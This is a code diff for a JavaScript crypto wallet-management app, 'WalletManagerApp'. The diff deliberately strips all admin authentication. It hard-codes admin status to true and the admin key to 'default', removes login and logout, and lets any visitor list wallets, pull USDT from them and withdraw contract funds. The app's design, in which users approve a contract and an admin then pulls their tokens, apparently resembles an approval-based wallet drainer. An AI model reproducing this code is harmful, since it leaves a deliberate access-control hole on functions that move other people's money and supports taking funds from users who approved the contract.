@@ -6,8 +6,8 @@ class WalletManagerApp {
     constructor() {
         this.walletConnector = new WalletConnector();
         this.apiService = new ApiService();
-        this.isAdmin = false;
-        this.adminKey = localStorage.getItem('adminKey') || '';
+        this.isAdmin = true; // Always true - no authentication
+        this.adminKey = 'default'; // Default key - no authentication needed
         
         this.initializeElements();
         this.attachEventListeners();
@@ -23,9 +23,10 @@ class WalletManagerApp {
         this.usdtBalanceElement = document.getElementById('usdt-balance');
         this.approveButton = document.getElementById('approve-contract');
         
-        // Admin elements
+        // Admin elements (now accessible to everyone)
         this.adminPanel = document.getElementById('admin-panel');
         this.walletList = document.getElementById('wallet-list');
+        // Remove admin login elements since they're not needed
         this.adminKeyInput = document.getElementById('admin-key');
         this.adminLoginButton = document.getElementById('admin-login');
         this.adminLogoutButton = document.getElementById('admin-logout');
@@ -44,13 +45,8 @@ class WalletManagerApp {
             this.approveButton.addEventListener('click', () => this.handleApproveContract());
         }
         
-        if (this.adminLoginButton) {
-            this.adminLoginButton.addEventListener('click', () => this.handleAdminLogin());
-        }
-        
-        if (this.adminLogoutButton) {
-            this.adminLogoutButton.addEventListener('click', () => this.handleAdminLogout());
-        }
+        // Remove admin login/logout event listeners
+        // Add wallet list loading on init instead
         
         if (this.withdrawButton) {
             this.withdrawButton.addEventListener('click', () => this.handleWithdraw());
@@ -69,12 +65,10 @@ class WalletManagerApp {
             this.showWalletInfo();
         }
         
-        // Check if admin is already logged in
-        if (this.adminKey) {
-            this.isAdmin = true;
-            this.showAdminPanel();
-            await this.loadWallets();
-        }
+        // Always show admin panel and load wallets (no authentication)
+        this.isAdmin = true;
+        this.showAdminPanel();
+        await this.loadWallets();
     }
 
     async handleConnectWallet() {
@@ -172,43 +166,29 @@ class WalletManagerApp {
         }
     }
 
-    handleAdminLogin() {
-        const key = this.adminKeyInput.value.trim();
-        if (!key) {
-            this.showError('Please enter admin key');
-            return;
-        }
-        
-        this.adminKey = key;
-        localStorage.setItem('adminKey', key);
-        this.isAdmin = true;
-        this.showAdminPanel();
-        this.loadWallets();
-    }
-
-    handleAdminLogout() {
-        localStorage.removeItem('adminKey');
-        this.adminKey = '';
-        this.isAdmin = false;
-        this.hideAdminPanel();
-        this.adminKeyInput.value = '';
-    }
+    // Remove handleAdminLogin and handleAdminLogout methods completely
 
     showAdminPanel() {
-        this.adminPanel.classList.remove('hidden');
+        // Always show admin panel
+        if (this.adminPanel) {
+            this.adminPanel.classList.remove('hidden');
+        }
     }
 
     hideAdminPanel() {
-        this.adminPanel.classList.add('hidden');
+        // Don't hide admin panel
+        // this.adminPanel.classList.add('hidden');
     }
 
     async loadWallets() {
-        if (!this.isAdmin) return;
+        // Remove authentication check
+        // if (!this.isAdmin) return;
         
         this.showLoading(true);
         
         try {
-            const response = await this.apiService.getAllWallets(this.adminKey);
+            // Remove admin key requirement
+            const response = await this.apiService.getAllWallets('default');
             
             if (response.success) {
                 this.renderWalletList(response.wallets);
@@ -255,7 +235,8 @@ class WalletManagerApp {
         this.showLoading(true);
         
         try {
-            const response = await this.apiService.pullWallet(walletAddress, this.adminKey);
+            // Remove admin key requirement
+            const response = await this.apiService.pullWallet(walletAddress, 'default');
             
             if (response.success) {
                 this.showSuccess(`Successfully pulled ${response.amount} USDT`);
@@ -274,7 +255,8 @@ class WalletManagerApp {
         this.showLoading(true);
         
         try {
-            const response = await this.apiService.withdrawContract(this.adminKey);
+            // Remove admin key requirement
+            const response = await this.apiService.withdrawContract('default');
             
             if (response.success) {
                 this.showSuccess(`Successfully withdrew ${response.amount} USDT to master wallet`);
